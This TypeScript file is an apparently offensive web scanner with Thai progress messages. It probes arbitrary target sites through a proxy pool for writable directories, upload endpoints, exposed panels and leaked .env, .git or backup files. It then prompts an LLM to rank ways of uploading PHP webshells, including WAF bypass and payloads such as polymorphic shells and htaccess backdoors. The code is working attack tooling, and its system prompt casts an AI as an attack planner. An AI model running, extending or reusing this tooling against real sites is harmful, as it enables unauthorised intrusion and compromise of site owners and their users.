/**
 * AI Vulnerability Analyzer — Real HTTP-based scanning
 * Scans target for exploitable paths, CMS weaknesses, upload vectors,
 * then uses AI to rank attack vectors by success probability.
 */
import { invokeLLM } from "./_core/llm";
import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface VulnScanResult {
  target: string;
  serverInfo: ServerInfo;
  cms: CmsDetection;
  writablePaths: WritablePath[];
  uploadEndpoints: UploadEndpoint[];
  exposedPanels: ExposedPanel[];
  misconfigurations: Misconfiguration[];
  attackVectors: RankedAttackVector[];
  aiAnalysis: string;
  scanDuration: number;
  timestamp: number;
}

export interface ServerInfo {
  ip: string;
  server: string;
  poweredBy: string;
  os: string;
  phpVersion: string;
  headers: Record<string, string>;
  waf: string | null;
  cdn: string | null;
  ssl: boolean;
  httpMethods: string[];
}

export interface CmsDetection {
  type: "wordpress" | "joomla" | "drupal" | "magento" | "shopify" | "custom" | "static" | "unknown";
  version: string;
  plugins: string[];
  themes: string[];
  vulnerableComponents: string[];
  adminUrl: string;
  loginUrl: string;
  apiEndpoints: string[];
}

export interface WritablePath {
  path: string;
  method: "PUT" | "POST" | "MOVE" | "MKCOL";
  verified: boolean;
  statusCode: number;
  contentType: string;
  allowsPhp: boolean;
}

export interface UploadEndpoint {
  url: string;
  method: string;
  fieldName: string;
  acceptsPhp: boolean;
  maxSize: number;
  authRequired: boolean;
  csrfToken: string | null;
  verified: boolean;
}

export interface ExposedPanel {
  url: string;
  type: "admin" | "filemanager" | "phpmyadmin" | "cpanel" | "plesk" | "webdav" | "ftp_web" | "other";
  authRequired: boolean;
  defaultCreds: boolean;
}

export interface Misconfiguration {
  type: string;
  detail: string;
  severity: "critical" | "high" | "medium" | "low";
  exploitable: boolean;
  path: string;
}

export interface RankedAttackVector {
  id: string;
  name: string;
  method: string;
  targetPath: string;
  successProbability: number;
  shellType: "php" | "asp" | "aspx" | "jsp" | "htaccess" | "js" | "html";
  technique: string;
  payloadType: string;
  riskLevel: number;
  aiReasoning: string;
}

export type ScanProgressCallback = (stage: string, detail: string, progress: number) => void;

// ═══════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
const FETCH_TIMEOUT = 6000; // 6s per request (reduced from 10s to prevent scan hangs)

const COMMON_UPLOAD_PATHS = [
  "/wp-content/uploads/",
  "/wp-includes/",
  "/wp-admin/includes/",
  "/uploads/",
  "/upload/",
  "/images/",
  "/img/",
  "/media/",
  "/files/",
  "/assets/",
  "/static/",
  "/tmp/",
  "/temp/",
  "/cache/",
  "/backup/",
  "/data/",
  "/content/",
  "/public/",
  "/storage/",
  "/var/",
];

const WP_VULNERABLE_PATHS = [
  "/wp-content/uploads/",
  "/wp-content/themes/",
  "/wp-content/plugins/",
  "/wp-includes/",
  "/wp-admin/includes/",
  "/wp-content/upgrade/",
  "/wp-content/cache/",
  "/wp-content/temp/",
  "/wp-content/backups/",
];

const UPLOAD_FORM_PATHS = [
  "/wp-admin/media-new.php",
  "/wp-admin/async-upload.php",
  "/administrator/index.php",
  "/admin/upload",
  "/upload.php",
  "/filemanager/",
  "/elfinder/",
  "/kcfinder/upload.php",
  "/ckeditor/upload",
  "/tinymce/upload",
  "/api/upload",
  "/api/v1/upload",
  "/api/files",
  "/api/media",
];

const ADMIN_PANELS = [
  { path: "/wp-admin/", type: "admin" as const },
  { path: "/wp-login.php", type: "admin" as const },
  { path: "/administrator/", type: "admin" as const },
  { path: "/admin/", type: "admin" as const },
  { path: "/user/login", type: "admin" as const },
  { path: "/phpmyadmin/", type: "phpmyadmin" as const },
  { path: "/pma/", type: "phpmyadmin" as const },
  { path: "/cpanel/", type: "cpanel" as const },
  { path: "/plesk/", type: "plesk" as const },
  { path: "/webdav/", type: "webdav" as const },
  { path: "/filemanager/", type: "filemanager" as const },
  { path: "/.well-known/", type: "other" as const },
];

const WAF_SIGNATURES: Record<string, string[]> = {
  cloudflare: ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare"],
  sucuri: ["x-sucuri-id", "sucuri"],
  wordfence: ["wordfence"],
  modsecurity: ["mod_security", "modsec"],
  akamai: ["akamai", "x-akamai"],
  incapsula: ["incap_ses", "x-iinfo", "incapsula"],
  aws_waf: ["x-amzn-requestid", "awselb"],
  fortinet: ["fortigate", "fortiweb"],
};

const CDN_SIGNATURES: Record<string, string[]> = {
  cloudflare: ["cf-ray", "cf-cache-status"],
  fastly: ["x-served-by", "x-cache", "fastly"],
  akamai: ["x-akamai-transformed"],
  cloudfront: ["x-amz-cf-id", "x-amz-cf-pop"],
  stackpath: ["x-hw"],
};

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

async function safeFetch(url: string, options: RequestInit = {}): Promise<Response | null> {
  try {
    const domain = url.includes("://") ? new URL(url).hostname : undefined;
    const { response } = await fetchWithPoolProxy(url, {
      ...options,
      headers: { "User-Agent": UA, ...(options.headers || {}) },
      redirect: "follow",
    }, { targetDomain: domain, timeout: FETCH_TIMEOUT });
    return response;
  } catch {
    return null;
  }
}

function ensureUrl(domain: string): string {
  if (domain.startsWith("http")) return domain.replace(/\/+$/, "");
  return `https://${domain}`.replace(/\/+$/, "");
}

// ═══════════════════════════════════════════════════════
//  STAGE 1: SERVER FINGERPRINTING
// ═══════════════════════════════════════════════════════

async function fingerprint(baseUrl: string, onProgress: ScanProgressCallback): Promise<ServerInfo> {
  onProgress("fingerprint", "กำลังสแกนข้อมูลเซิร์ฟเวอร์...", 5);

  const resp = await safeFetch(baseUrl);
  const headers: Record<string, string> = {};
  if (resp) {
    resp.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
  }

  // Detect WAF
  let waf: string | null = null;
  const headerStr = JSON.stringify(headers).toLowerCase();
  for (const [name, sigs] of Object.entries(WAF_SIGNATURES)) {
    if (sigs.some(s => headerStr.includes(s))) { waf = name; break; }
  }

  // Detect CDN
  let cdn: string | null = null;
  for (const [name, sigs] of Object.entries(CDN_SIGNATURES)) {
    if (sigs.some(s => headerStr.includes(s))) { cdn = name; break; }
  }

  // Check allowed HTTP methods via OPTIONS
  let httpMethods: string[] = ["GET", "POST"];
  try {
    const optResp = await safeFetch(baseUrl, { method: "OPTIONS" });
    if (optResp) {
      const allow = optResp.headers.get("allow") || optResp.headers.get("access-control-allow-methods") || "";
      if (allow) httpMethods = allow.split(",").map(m => m.trim().toUpperCase());
    }
  } catch { /* ignore */ }

  // Resolve IP
  let ip = "";
  try {
    const dnsResp = await safeFetch(`https://dns.google/resolve?name=${new URL(baseUrl).hostname}&type=A`);
    if (dnsResp) {
      const data = await dnsResp.json() as any;
      ip = data?.Answer?.[0]?.data || "";
    }
  } catch { /* ignore */ }

  onProgress("fingerprint", `เซิร์ฟเวอร์: ${headers["server"] || "unknown"}, WAF: ${waf || "none"}, CDN: ${cdn || "none"}`, 10);

  return {
    ip,
    server: headers["server"] || "unknown",
    poweredBy: headers["x-powered-by"] || "",
    os: headers["server"]?.toLowerCase().includes("win") ? "windows" : "linux",
    phpVersion: (headers["x-powered-by"] || "").match(/PHP\/([\d.]+)/)?.[1] || "",
    headers,
    waf,
    cdn,
    ssl: baseUrl.startsWith("https"),
    httpMethods,
  };
}

// ═══════════════════════════════════════════════════════
//  STAGE 2: CMS DETECTION
// ═══════════════════════════════════════════════════════

async function detectCms(baseUrl: string, onProgress: ScanProgressCallback): Promise<CmsDetection> {
  onProgress("cms_detect", "กำลังตรวจจับ CMS...", 15);

  const result: CmsDetection = {
    type: "unknown",
    version: "",
    plugins: [],
    themes: [],
    vulnerableComponents: [],
    adminUrl: "",
    loginUrl: "",
    apiEndpoints: [],
  };

  // Check WordPress
  const wpResp = await safeFetch(`${baseUrl}/wp-login.php`);
  if (wpResp && (wpResp.status === 200 || wpResp.status === 302)) {
    result.type = "wordpress";
    result.loginUrl = `${baseUrl}/wp-login.php`;
    result.adminUrl = `${baseUrl}/wp-admin/`;

    // Check WP REST API
    const apiResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/`);
    if (apiResp && apiResp.status === 200) {
      result.apiEndpoints.push(`${baseUrl}/wp-json/wp/v2/`);
      // Try to get version
      try {
        const apiData = await apiResp.json() as any;
        if (apiData?.namespace) result.version = apiData.namespace;
      } catch { /* ignore */ }
    }

    // Check XMLRPC
    const xmlrpcResp = await safeFetch(`${baseUrl}/xmlrpc.php`, { method: "POST", body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' });
    if (xmlrpcResp && xmlrpcResp.status === 200) {
      result.apiEndpoints.push(`${baseUrl}/xmlrpc.php`);
      result.vulnerableComponents.push("xmlrpc_enabled");
    }

    // Enumerate plugins via common paths (parallel for speed)
    const commonPlugins = [
      "contact-form-7", "akismet", "jetpack", "woocommerce", "elementor",
      "wpforms-lite", "classic-editor", "yoast-seo", "wordfence", "updraftplus",
      "really-simple-ssl", "all-in-one-seo-pack", "wp-super-cache", "w3-total-cache",
      "wp-file-manager", "duplicator", "file-manager-advanced", "wp-filemanager",
    ];
    const pluginResults = await Promise.allSettled(
      commonPlugins.map(async (plugin) => {
        const pResp = await safeFetch(`${baseUrl}/wp-content/plugins/${plugin}/readme.txt`);
        if (pResp && pResp.status === 200) return plugin;
        return null;
      })
    );
    for (const pr of pluginResults) {
      if (pr.status === "fulfilled" && pr.value) {
        result.plugins.push(pr.value);
        if (["wp-file-manager", "file-manager-advanced", "wp-filemanager", "duplicator"].includes(pr.value)) {
          result.vulnerableComponents.push(`plugin:${pr.value}`);
        }
      }
    }

    onProgress("cms_detect", `WordPress detected — ${result.plugins.length} plugins, ${result.vulnerableComponents.length} vulnerable`, 25);
    return result;
  }

  // Check Joomla
  const joomlaResp = await safeFetch(`${baseUrl}/administrator/`);
  if (joomlaResp && joomlaResp.status === 200) {
    const body = await joomlaResp.text();
    if (body.includes("Joomla") || body.includes("joomla")) {
      result.type = "joomla";
      result.adminUrl = `${baseUrl}/administrator/`;
      result.loginUrl = `${baseUrl}/administrator/index.php`;
      onProgress("cms_detect", "Joomla detected", 25);
      return result;
    }
  }

  // Check Drupal
  const drupalResp = await safeFetch(`${baseUrl}/core/CHANGELOG.txt`);
  if (drupalResp && drupalResp.status === 200) {
    result.type = "drupal";
    result.adminUrl = `${baseUrl}/admin/`;
    result.loginUrl = `${baseUrl}/user/login`;
    onProgress("cms_detect", "Drupal detected", 25);
    return result;
  }

  // Check homepage for CMS hints
  const homeResp = await safeFetch(baseUrl);
  if (homeResp) {
    const body = await homeResp.text().catch(() => "");
    if (body.includes("wp-content") || body.includes("wp-includes")) {
      result.type = "wordpress";
    } else if (body.includes("/media/jui/") || body.includes("Joomla")) {
      result.type = "joomla";
    } else if (body.includes("Drupal") || body.includes("drupal.js")) {
      result.type = "drupal";
    } else if (body.includes("Magento") || body.includes("mage/")) {
      result.type = "magento";
    } else if (body.includes("Shopify") || body.includes("cdn.shopify.com")) {
      result.type = "shopify";
    } else if (body.includes("<html") && !body.includes("<?php")) {
      result.type = "static";
    } else {
      result.type = "custom";
    }
  }

  onProgress("cms_detect", `CMS: ${result.type}`, 25);
  return result;
}

// ═══════════════════════════════════════════════════════
//  STAGE 3: WRITABLE PATH DISCOVERY
// ═══════════════════════════════════════════════════════

async function discoverWritablePaths(
  baseUrl: string,
  cms: CmsDetection,
  serverInfo: ServerInfo,
  onProgress: ScanProgressCallback,
): Promise<WritablePath[]> {
  onProgress("writable_paths", "กำลังค้นหา writable paths...", 30);

  const paths = cms.type === "wordpress" ? [...WP_VULNERABLE_PATHS, ...COMMON_UPLOAD_PATHS] : COMMON_UPLOAD_PATHS;
  const uniquePaths = Array.from(new Set(paths));
  const results: WritablePath[] = [];

  // Process paths in parallel batches of 5 to speed up scanning
  const BATCH_SIZE = 5;
  for (let batchStart = 0; batchStart < uniquePaths.length; batchStart += BATCH_SIZE) {
    const batch = uniquePaths.slice(batchStart, batchStart + BATCH_SIZE);
    const batchResults = await Promise.allSettled(batch.map(async (path) => {
      const pathResults: WritablePath[] = [];
      const testFilename = `test_${Date.now()}_${Math.random().toString(36).slice(2, 8)}.txt`;
      const fullUrl = `${baseUrl}${path}${testFilename}`;

      // Try PUT
      if (serverInfo.httpMethods.includes("PUT")) {
        const putResp = await safeFetch(fullUrl, {
          method: "PUT",
          body: "test_write_check",
          headers: { "Content-Type": "text/plain" },
        });
        if (putResp && (putResp.ok || putResp.status === 201)) {
          const verifyResp = await safeFetch(fullUrl);
          const verified = verifyResp !== null && verifyResp.ok;
          pathResults.push({
            path,
            method: "PUT",
            verified,
            statusCode: putResp.status,
            contentType: putResp.headers.get("content-type") || "",
            allowsPhp: true,
          });
          await safeFetch(fullUrl, { method: "DELETE" }).catch(() => {});
          if (verified) return pathResults;
        }
      }

      // Try POST multipart upload
      const formData = new FormData();
      const blob = new Blob(["test_write_check"], { type: "text/plain" });
      formData.append("file", blob, testFilename);
      formData.append("upload", blob, testFilename);

      const postResp = await safeFetch(`${baseUrl}${path}`, {
        method: "POST",
        body: formData,
      });
      if (postResp && (postResp.ok || postResp.status === 201)) {
        pathResults.push({
          path,
          method: "POST",
          verified: false,
          statusCode: postResp.status,
          contentType: postResp.headers.get("content-type") || "",
          allowsPhp: false,
        });
      }

      // Check if directory listing is enabled
      const dirResp = await safeFetch(`${baseUrl}${path}`);
      if (dirResp && dirResp.ok) {
        const body = await dirResp.text().catch(() => "");
        if (body.includes("Index of") || body.includes("Directory listing") || body.includes("<title>Index of")) {
          pathResults.push({
            path,
            method: "PUT",
            verified: false,
            statusCode: dirResp.status,
            contentType: "directory_listing",
            allowsPhp: true,
          });
        }
      }
      return pathResults;
    }));

    for (const r of batchResults) {
      if (r.status === "fulfilled" && r.value) {
        results.push(...r.value);
      }
    }

    onProgress("writable_paths", `สแกน ${Math.min(batchStart + BATCH_SIZE, uniquePaths.length)}/${uniquePaths.length} paths — พบ ${results.length} writable`, 30 + (Math.min(batchStart + BATCH_SIZE, uniquePaths.length) / uniquePaths.length) * 10);
  }

  onProgress("writable_paths", `พบ ${results.length} writable paths`, 40);
  return results;
}

// ═══════════════════════════════════════════════════════
//  STAGE 4: UPLOAD ENDPOINT DISCOVERY
// ═══════════════════════════════════════════════════════

async function discoverUploadEndpoints(
  baseUrl: string,
  cms: CmsDetection,
  onProgress: ScanProgressCallback,
): Promise<UploadEndpoint[]> {
  onProgress("upload_endpoints", "กำลังค้นหา upload endpoints...", 45);

  const results: UploadEndpoint[] = [];

  // Check all upload form paths in parallel
  const uploadFormResults = await Promise.allSettled(
    UPLOAD_FORM_PATHS.map(async (path) => {
      const resp = await safeFetch(`${baseUrl}${path}`);
      if (!resp || resp.status >= 400) return null;

      const body = await resp.text().catch(() => "");
      const hasUploadForm = body.includes('type="file"') || body.includes("multipart/form-data") || body.includes("dropzone");
      const authRequired = body.includes("login") || body.includes("password") || resp.status === 401 || resp.status === 403;

      let csrfToken: string | null = null;
      const csrfMatch = body.match(/name="(?:_token|csrf_token|_csrf|nonce|_wpnonce)"[^>]*value="([^"]+)"/);
      if (csrfMatch) csrfToken = csrfMatch[1];

      let fieldName = "file";
      const fieldMatch = body.match(/name="([^"]*)"[^>]*type="file"/);
      if (fieldMatch) fieldName = fieldMatch[1];

      if (hasUploadForm || path.includes("upload") || path.includes("media")) {
        return {
          url: `${baseUrl}${path}`,
          method: "POST" as const,
          fieldName,
          acceptsPhp: !body.includes("accept=") || body.includes(".php"),
          maxSize: 0,
          authRequired,
          csrfToken,
          verified: hasUploadForm,
        };
      }
      return null;
    })
  );
  for (const ufr of uploadFormResults) {
    if (ufr.status === "fulfilled" && ufr.value) {
      results.push(ufr.value);
    }
  }

  // Check CMS-specific API upload endpoints
  if (cms.type === "wordpress") {
    // WP REST API media upload
    const wpMediaResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/media`, {
      method: "POST",
      headers: { "Content-Type": "image/jpeg" },
      body: "test",
    });
    if (wpMediaResp && wpMediaResp.status !== 404) {
      results.push({
        url: `${baseUrl}/wp-json/wp/v2/media`,
        method: "POST",
        fieldName: "file",
        acceptsPhp: false,
        maxSize: 0,
        authRequired: wpMediaResp.status === 401,
        csrfToken: null,
        verified: true,
      });
    }

    // WP async-upload
    results.push({
      url: `${baseUrl}/wp-admin/async-upload.php`,
      method: "POST",
      fieldName: "async-upload",
      acceptsPhp: false,
      maxSize: 0,
      authRequired: true,
      csrfToken: null,
      verified: false,
    });
  }

  onProgress("upload_endpoints", `พบ ${results.length} upload endpoints`, 55);
  return results;
}

// ═══════════════════════════════════════════════════════
//  STAGE 5: EXPOSED PANELS & MISCONFIGURATIONS
// ═══════════════════════════════════════════════════════

async function scanExposedPanels(baseUrl: string, onProgress: ScanProgressCallback): Promise<ExposedPanel[]> {
  onProgress("panels", "กำลังสแกน exposed panels...", 58);

  const results: ExposedPanel[] = [];

  // Check all admin panels in parallel
  const panelResults = await Promise.allSettled(
    ADMIN_PANELS.map(async (panel) => {
      const resp = await safeFetch(`${baseUrl}${panel.path}`);
      if (!resp || resp.status >= 400) return null;

      const body = await resp.text().catch(() => "");
      const authRequired = body.includes("login") || body.includes("password") || body.includes("username");
      const defaultCreds = body.includes("admin") && (body.includes("password") || body.includes("123456"));

      return {
        url: `${baseUrl}${panel.path}`,
        type: panel.type,
        authRequired,
        defaultCreds,
      };
    })
  );
  for (const pr of panelResults) {
    if (pr.status === "fulfilled" && pr.value) {
      results.push(pr.value);
    }
  }

  onProgress("panels", `พบ ${results.length} exposed panels`, 62);
  return results;
}

async function scanMisconfigurations(baseUrl: string, serverInfo: ServerInfo, onProgress: ScanProgressCallback): Promise<Misconfiguration[]> {
  onProgress("misconfig", "กำลังสแกน misconfigurations...", 65);

  const results: Misconfiguration[] = [];

  // Check .env file exposure
  const envResp = await safeFetch(`${baseUrl}/.env`);
  if (envResp && envResp.ok) {
    const body = await envResp.text().catch(() => "");
    if (body.includes("=") && (body.includes("DB_") || body.includes("APP_") || body.includes("SECRET"))) {
      results.push({
        type: "env_exposure",
        detail: ".env file is publicly accessible — contains credentials",
        severity: "critical",
        exploitable: true,
        path: "/.env",
      });
    }
  }

  // Check .git exposure
  const gitResp = await safeFetch(`${baseUrl}/.git/config`);
  if (gitResp && gitResp.ok) {
    results.push({
      type: "git_exposure",
      detail: ".git directory is publicly accessible — source code leak",
      severity: "critical",
      exploitable: true,
      path: "/.git/",
    });
  }

  // Check phpinfo
  for (const path of ["/phpinfo.php", "/info.php", "/php_info.php", "/test.php"]) {
    const phpResp = await safeFetch(`${baseUrl}${path}`);
    if (phpResp && phpResp.ok) {
      const body = await phpResp.text().catch(() => "");
      if (body.includes("phpinfo()") || body.includes("PHP Version")) {
        results.push({
          type: "phpinfo_exposure",
          detail: `phpinfo() exposed at ${path} — reveals server configuration`,
          severity: "high",
          exploitable: true,
          path,
        });
        break;
      }
    }
  }

  // Check debug mode (parallel)
  const debugPaths = ["/debug", "/_debugbar", "/telescope", "/horizon"];
  const debugResults = await Promise.allSettled(
    debugPaths.map(async (path) => {
      const debugResp = await safeFetch(`${baseUrl}${path}`);
      if (debugResp && debugResp.ok) return path;
      return null;
    })
  );
  for (const dr of debugResults) {
    if (dr.status === "fulfilled" && dr.value) {
      results.push({
        type: "debug_exposure",
        detail: `Debug panel exposed at ${dr.value}`,
        severity: "high",
        exploitable: true,
        path: dr.value,
      });
    }
  }

  // Check directory listing on root
  if (!serverInfo.waf) {
    const rootResp = await safeFetch(baseUrl);
    if (rootResp) {
      const body = await rootResp.text().catch(() => "");
      if (body.includes("Index of /")) {
        results.push({
          type: "directory_listing",
          detail: "Directory listing enabled on root — all files visible",
          severity: "high",
          exploitable: true,
          path: "/",
        });
      }
    }
  }

  // Check backup files (parallel)
  const backupPaths = ["/backup.zip", "/backup.tar.gz", "/db.sql", "/database.sql", "/wp-config.php.bak", "/config.php.bak"];
  const backupResults = await Promise.allSettled(
    backupPaths.map(async (path) => {
      const backupResp = await safeFetch(`${baseUrl}${path}`, { method: "HEAD" });
      if (backupResp && backupResp.ok) return path;
      return null;
    })
  );
  for (const br of backupResults) {
    if (br.status === "fulfilled" && br.value) {
      results.push({
        type: "backup_exposure",
        detail: `Backup file accessible at ${br.value}`,
        severity: "critical",
        exploitable: true,
        path: br.value,
      });
    }
  }

  // Check security headers
  if (!serverInfo.headers["x-frame-options"]) {
    results.push({ type: "missing_xfo", detail: "X-Frame-Options header missing", severity: "medium", exploitable: false, path: "/" });
  }
  if (!serverInfo.headers["content-security-policy"]) {
    results.push({ type: "missing_csp", detail: "Content-Security-Policy header missing", severity: "medium", exploitable: false, path: "/" });
  }
  if (!serverInfo.headers["x-content-type-options"]) {
    results.push({ type: "missing_xcto", detail: "X-Content-Type-Options header missing — allows MIME sniffing", severity: "medium", exploitable: true, path: "/" });
  }

  onProgress("misconfig", `พบ ${results.length} misconfigurations (${results.filter(m => m.severity === "critical").length} critical)`, 70);
  return results;
}

// ═══════════════════════════════════════════════════════
//  STAGE 6: AI ATTACK VECTOR RANKING
// ═══════════════════════════════════════════════════════

async function aiRankAttackVectors(
  target: string,
  serverInfo: ServerInfo,
  cms: CmsDetection,
  writablePaths: WritablePath[],
  uploadEndpoints: UploadEndpoint[],
  exposedPanels: ExposedPanel[],
  misconfigs: Misconfiguration[],
  onProgress: ScanProgressCallback,
): Promise<{ vectors: RankedAttackVector[]; analysis: string }> {
  onProgress("ai_analysis", "🤖 AI กำลังวิเคราะห์ช่องโหว่และจัดอันดับ attack vectors...", 75);

  const scanSummary = {
    target,
    server: serverInfo.server,
    os: serverInfo.os,
    php: serverInfo.phpVersion,
    waf: serverInfo.waf,
    cdn: serverInfo.cdn,
    cms: cms.type,
    cmsVersion: cms.version,
    plugins: cms.plugins,
    vulnerableComponents: cms.vulnerableComponents,
    writablePaths: writablePaths.map(p => ({ path: p.path, method: p.method, verified: p.verified })),
    uploadEndpoints: uploadEndpoints.map(e => ({ url: e.url, auth: e.authRequired, verified: e.verified })),
    exposedPanels: exposedPanels.map(p => ({ url: p.url, type: p.type, auth: p.authRequired })),
    criticalMisconfigs: misconfigs.filter(m => m.severity === "critical" || m.severity === "high"),
    httpMethods: serverInfo.httpMethods,
  };

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester and web security analyst. Given a vulnerability scan result, you must:
1. Analyze all findings and determine the most effective attack vectors for uploading a PHP/shell file
2. Rank each vector by success probability (0-100%)
3. For each vector, specify the exact shell type, upload method, and target path
4. Consider WAF bypass techniques if WAF is detected
5. Prioritize vectors that allow PHP execution

Respond in JSON format with this schema:
{
  "vectors": [
    {
      "id": "string",
      "name": "string (Thai description)",
      "method": "PUT|POST|MOVE|exploit",
      "targetPath": "/path/to/upload/",
      "successProbability": number (0-100),
      "shellType": "php|asp|aspx|jsp|htaccess|js|html",
      "technique": "string (specific technique)",
      "payloadType": "polymorphic_shell|steganography|htaccess_backdoor|redirect_shell|js_injector",
      "riskLevel": number (1-10),
      "aiReasoning": "string (Thai explanation of why this vector might work)"
    }
  ],
  "analysis": "string (Thai comprehensive analysis of the target's security posture and recommended attack strategy)"
}`,
        },
        {
          role: "user",
          content: `วิเคราะห์ผลสแกนนี้และจัดอันดับ attack vectors:\n\n${JSON.stringify(scanSummary, null, 2)}`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_vectors",
          strict: true,
          schema: {
            type: "object",
            properties: {
              vectors: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    id: { type: "string" },
                    name: { type: "string" },
                    method: { type: "string" },
                    targetPath: { type: "string" },
                    successProbability: { type: "number" },
                    shellType: { type: "string" },
                    technique: { type: "string" },
                    payloadType: { type: "string" },
                    riskLevel: { type: "number" },
                    aiReasoning: { type: "string" },
                  },
                  required: ["id", "name", "method", "targetPath", "successProbability", "shellType", "technique", "payloadType", "riskLevel", "aiReasoning"],
                  additionalProperties: false,
                },
              },
              analysis: { type: "string" },
            },
            required: ["vectors", "analysis"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content as string | undefined;
    if (content) {
      const parsed = JSON.parse(content);
      // Sort by success probability descending
      parsed.vectors.sort((a: any, b: any) => b.successProbability - a.successProbability);
      onProgress("ai_analysis", `AI วิเคราะห์เสร็จ — ${parsed.vectors.length} attack vectors จัดอันดับแล้ว`, 85);
      return parsed;
    }
  } catch (error) {
    onProgress("ai_analysis", "AI analysis failed — using rule-based ranking", 85);
  }

  // Fallback: rule-based ranking
  const vectors: RankedAttackVector[] = [];

  // Rank writable paths
  for (const wp of writablePaths) {
    vectors.push({
      id: `writable_${wp.path.replace(/\//g, "_")}`,
      name: `Direct upload via ${wp.method} to ${wp.path}`,
      method: wp.method,
      targetPath: wp.path,
      successProbability: wp.verified ? 85 : 40,
      shellType: "php",
      technique: `${wp.method} file upload to writable directory`,
      payloadType: "polymorphic_shell",
      riskLevel: 7,
      aiReasoning: wp.verified ? "Path verified writable — high chance of success" : "Path may be writable — needs verification",
    });
  }

  // Rank upload endpoints
  for (const ep of uploadEndpoints) {
    vectors.push({
      id: `upload_${ep.url.replace(/[^a-z0-9]/gi, "_")}`,
      name: `Form upload to ${ep.url}`,
      method: ep.method,
      targetPath: ep.url,
      successProbability: ep.authRequired ? 15 : (ep.verified ? 60 : 30),
      shellType: "php",
      technique: "Multipart form upload",
      payloadType: ep.acceptsPhp ? "polymorphic_shell" : "steganography",
      riskLevel: 6,
      aiReasoning: ep.authRequired ? "Requires authentication — lower probability" : "Open upload endpoint",
    });
  }

  // Rank CMS-specific vectors
  if (cms.vulnerableComponents.length > 0) {
    for (const comp of cms.vulnerableComponents) {
      vectors.push({
        id: `vuln_${comp}`,
        name: `Exploit vulnerable component: ${comp}`,
        method: "exploit",
        targetPath: comp.startsWith("plugin:") ? `/wp-content/plugins/${comp.replace("plugin:", "")}/` : "/",
        successProbability: 55,
        shellType: "php",
        technique: `CMS plugin/component exploit`,
        payloadType: "polymorphic_shell",
        riskLevel: 9,
        aiReasoning: `Known vulnerable component detected: ${comp}`,
      });
    }
  }

  vectors.sort((a, b) => b.successProbability - a.successProbability);
  return {
    vectors,
    analysis: `Rule-based analysis: ${vectors.length} vectors identified. Server: ${serverInfo.server}, CMS: ${cms.type}, WAF: ${serverInfo.waf || "none"}`,
  };
}

// ═══════════════════════════════════════════════════════
//  MAIN: Full Vulnerability Scan
// ═══════════════════════════════════════════════════════

const FULL_SCAN_TIMEOUT = 120_000; // 2 minutes max for entire scan

export async function fullVulnScan(
  targetDomain: string,
  onProgress: ScanProgressCallback = () => {},
): Promise<VulnScanResult> {
  const start = Date.now();
  const baseUrl = ensureUrl(targetDomain);

  onProgress("start", `🔍 เริ่มสแกน ${baseUrl}...`, 0);

  // Helper: run a stage with individual timeout
  const runStage = async <T>(name: string, fn: () => Promise<T>, fallback: T, timeoutMs = 30_000): Promise<T> => {
    try {
      return await Promise.race([
        fn(),
        new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error(`Stage ${name} timed out after ${Math.round(timeoutMs / 1000)}s`)), timeoutMs)
        ),
      ]);
    } catch (err: any) {
      console.warn(`[VulnScan] Stage ${name} failed: ${err.message}`);
      onProgress(name as any, `⚠️ ${name} หมดเวลา/ล้มเหลว — ข้ามไป`, -1);
      return fallback;
    }
  };

  // Check overall timeout
  const checkTimeout = () => {
    if (Date.now() - start > FULL_SCAN_TIMEOUT) {
      throw new Error(`Full scan timed out after ${Math.round(FULL_SCAN_TIMEOUT / 1000)}s`);
    }
  };

  // Stage 1: Server fingerprinting (15s max)
  const serverInfo = await runStage("fingerprint", () => fingerprint(baseUrl, onProgress), {
    ip: "", server: "unknown", poweredBy: "", os: "linux", phpVersion: "",
    headers: {}, waf: null, cdn: null, ssl: baseUrl.startsWith("https"), httpMethods: ["GET", "POST"],
  }, 15_000);
  checkTimeout();

  // Stage 2: CMS detection (20s max)
  const cms = await runStage("cms_detect", () => detectCms(baseUrl, onProgress), {
    type: "unknown" as const, version: "", plugins: [], themes: [],
    vulnerableComponents: [], adminUrl: "", loginUrl: "", apiEndpoints: [],
  }, 20_000);
  checkTimeout();

  // Stage 3: Writable path discovery (30s max)
  const writablePaths = await runStage("writable_paths", () => discoverWritablePaths(baseUrl, cms, serverInfo, onProgress), [], 30_000);
  checkTimeout();

  // Stage 4: Upload endpoint discovery (15s max)
  const uploadEndpoints = await runStage("upload_endpoints", () => discoverUploadEndpoints(baseUrl, cms, onProgress), [], 15_000);
  checkTimeout();

  // Stage 5: Exposed panels & misconfigurations (15s max each)
  const exposedPanels = await runStage("panels", () => scanExposedPanels(baseUrl, onProgress), [], 15_000);
  const misconfigurations = await runStage("misconfig", () => scanMisconfigurations(baseUrl, serverInfo, onProgress), [], 15_000);
  checkTimeout();

  // Stage 6: AI attack vector ranking (30s max)
  const { vectors, analysis } = await runStage("ai_analysis", () => aiRankAttackVectors(
    baseUrl, serverInfo, cms, writablePaths, uploadEndpoints, exposedPanels, misconfigurations, onProgress,
  ), { vectors: [], analysis: "AI analysis timed out" }, 30_000);

  const result: VulnScanResult = {
    target: baseUrl,
    serverInfo,
    cms,
    writablePaths,
    uploadEndpoints,
    exposedPanels,
    misconfigurations,
    attackVectors: vectors,
    aiAnalysis: analysis,
    scanDuration: Date.now() - start,
    timestamp: Date.now(),
  };

  onProgress("complete", `✅ สแกนเสร็จ — ${vectors.length} attack vectors, ${writablePaths.length} writable paths, ${misconfigurations.filter(m => m.severity === "critical").length} critical misconfigs`, 100);

  return result;
}
